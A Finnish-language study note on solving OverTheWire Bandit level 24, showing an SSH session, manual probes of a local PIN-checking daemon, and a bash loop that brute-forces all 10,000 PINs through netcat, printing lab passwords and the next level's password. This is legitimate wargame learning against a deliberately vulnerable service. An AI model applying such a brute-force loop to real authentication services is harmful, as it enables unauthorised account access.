# level 24

OHJE JA VIHJE: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10 000 combinations, called brute-forcing.

Tämä on jotkain brute-force hyökkäystä: Portissa 30002 oleva daemon antaa bandit25-salasanan, jos sille syöttää bandit24-salasanan + oikean 4-numeroisen PIN-koodin. PIN pitää löytää brute-force-menetelmällä kokeilemalla kaikki yhdistelmät 0000–9999.


gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```
PS C:> ssh bandit24@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit24@bandit.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

bandit24@bandit:~$ ls
bandit24@bandit:~$ whoami
bandit24
```


## testausta ja tarkistusta

Pientä kysellyä tekoälyltä, että suoritettan skriptinsä ja runnattaan for-loop komento. Pin koodi on 0000 - 9999 eli 10 000 mahdollisuutta. Sekä data pitää lähettää porttiin `30 002` :lle ja kokeillaan `nc` - netcat komentoa.

- pieni kertaus level 15 - jossa käytettiin tätä komentoa `$nc localhost 300001` & `$ ncat --ssl -l 30001`
- esim. echo salasana jotakin että haettaakseen seuraavan tason salasana


pikainen tarkistus:
```
bandit24@bandit:~$ cd /etc/bandit_pass/
bandit24@bandit:/etc/bandit_pass$ ls
bandit0   bandit11  bandit14  bandit17  bandit2   bandit22  bandit25  bandit28  bandit30  bandit33  bandit6  bandit9
bandit1   bandit12  bandit15  bandit18  bandit20  bandit23  bandit26  bandit29  bandit31  bandit4   bandit7
bandit10  bandit13  bandit16  bandit19  bandit21  bandit24  bandit27  bandit3   bandit32  bandit5   bandit8
bandit24@bandit:/etc/bandit_pass$ cat bandit25
cat: bandit25: Permission denied

```

tässä syötin pelkä enterin ja esim. vale salasansa, että keskeytin koska en tiedä sitä salasanaa..: 
```
bandit24@bandit:/etc/bandit_pass$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

Wrong! Please enter the correct current password and pincode. Try again.

Wrong! Please enter the correct current password and pincode. Try again.

Wrong! Please enter the correct current password and pincode. Try again.
^C

bandit24@bandit:/etc/bandit_pass$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
1234
Wrong! Please enter the correct current password and pincode. Try again.
0000
Wrong! Please enter the correct current password and pincode. Try again.
^C
```

tarkistusta ja jostakin ohjeiden mukaan, että luo väliaikainen haekmisto (temporatory directory)
- tämä tarkoittaa että järjestelmä loi automaattisesti uniikin hakemiston polkuun
   - `mktemp -d` voi antaa eri polkuja riippuen ympäristöstä ja asetuksista.
   - muita polkuja mm. `/var/tmp` , `/dev/shm/`
- `mktemp -d` - luo satunnaisen, uniikin väliaikaisen hakemiston (yleensä /tmp-kansioon), jota voi käyttää turvallisesti skripteissä.

```
bandit24@bandit:/tmp$ mktemp -d
/tmp/tmp.TF6PCkB4R8
```

testattu omass kali linux esim.
```┌──(kali㉿kali)-[~]
└─$ mktemp -d    
/tmp/tmp.NLReNRzxxe
```

Tämä on malli for-loop:
- ensin for var jotakin numeroa esim. rajaa 0000 - 9999 asti tai tiettyn toistoa 
- do # tekee jotakin ja sitten valmis

```
for var in 1 2 ... N
do
	#something
done
```

Tämä on vain skripti ohje for-loop, että sen kautta runnataan siinä linux alla: 
- tässä tapahtuu että runnaa ja kokeillee kaikkia 10 000 mahdollista koodia (0000 - 9999) asti.
- että toistettaan mahdollisesti tämän level 24 salasana, että i tekee jotakin .txt:lle
- sekä jos vastaus menee niin suorittaa netcat komentonsa ja portin suorittamisen että löydettäkseen vastaus

```
#!/bin/bash

for i in {0000..9999}
do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
```

tarkistettan joku väliaikainen tiedosto ($mktemp -d)
```
bandit24@bandit:~$ mktemp -d
/tmp/tmp.IHAORm9Zb1
bandit24@bandit:~$ cd /tmp/tmp.IHAORm9Zb1
bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ nano brute-force-filu.sh
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ ls
brute-force-filu.sh
bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ cat brute-force-filu.sh
#!/bin/bash

for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt

bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ chmod +x brute-force-filu.sh
bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ ls -l
total 4
-rwxrwxr-x 1 bandit24 bandit24 170 May 30 10:48 brute-force-filu.sh
```

runnataan toi scripti ja tarkistettaan mitä se toisti:
- `bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ cat possibilities.txt` - tästä toisti turhaan koko 9999 rivi juttuja
```
bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ ./brute-force-filu.sh
bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ ls
brute-force-filu.sh  possibilities.txt  result.txt
```

tämä toisti erilaisen:
- mutta muutama yli kymmensä samoja toistoja kuitenkin ja kunnes tuli vastaus

```
bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ cat result.txt
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
....
.....
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

TOINEN METODI, sama mutta eri komento: 
- tämä kuin greppasi käänteisenä, mutta silti toisti noita väärä, että toista salasana ja pinkoodi mikälie
```
bandit24@bandit:/tmp/tmp.IHAORm9Zb1$ sort result.txt | grep -v "wrong!"

Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
```



## linkkejä ja vastaukset:

- https://mayadevbe.me/posts/overthewire/bandit/level25/
- https://david-varghese.medium.com/overthewire-bandit-level-24-level-25-517fb11f93a3
- https://gist.github.com/kaipee/e3046df72ce3f074b6268ee791a7c3a3

